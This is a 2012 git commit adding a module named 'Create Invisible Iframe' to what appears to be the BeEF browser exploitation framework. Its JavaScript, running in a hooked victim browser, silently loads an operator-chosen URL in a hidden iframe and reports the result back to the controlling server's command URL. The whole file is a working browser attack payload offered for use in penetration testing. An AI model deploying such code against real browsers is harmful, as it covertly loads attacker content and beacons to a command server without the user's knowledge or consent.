4432a9e46827ed5c2f73b50cb7f21dafb68d9448
bcoles <bcoles@gmail.com>
2012-06-27 01:50:07 +0930

    Added module: Create Invisible Iframe

---
+++ modules/misc/invisible_iframe/command.js
@@ -0,0 +1,24 @@
+//
+//   Copyright 2012 Wade Alcorn wade@bindshell.net
+//
+//   Licensed under the Apache License, Version 2.0 (the "License");
+//   you may not use this file except in compliance with the License.
+//   You may obtain a copy of the License at
+//
+//       http://www.apache.org/licenses/LICENSE-2.0
+//
+//   Unless required by applicable law or agreed to in writing, software
+//   distributed under the License is distributed on an "AS IS" BASIS,
+//   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+//   See the License for the specific language governing permissions and
+//   limitations under the License.
+//
+beef.execute(function() {
+
+	var target = "<%= @target %>";
+	var iframe_<%= @command_id %> = beef.dom.createInvisibleIframe();
+	iframe_<%= @command_id %>.setAttribute('src', target);
+
+	beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=IFrame created');
+
+});
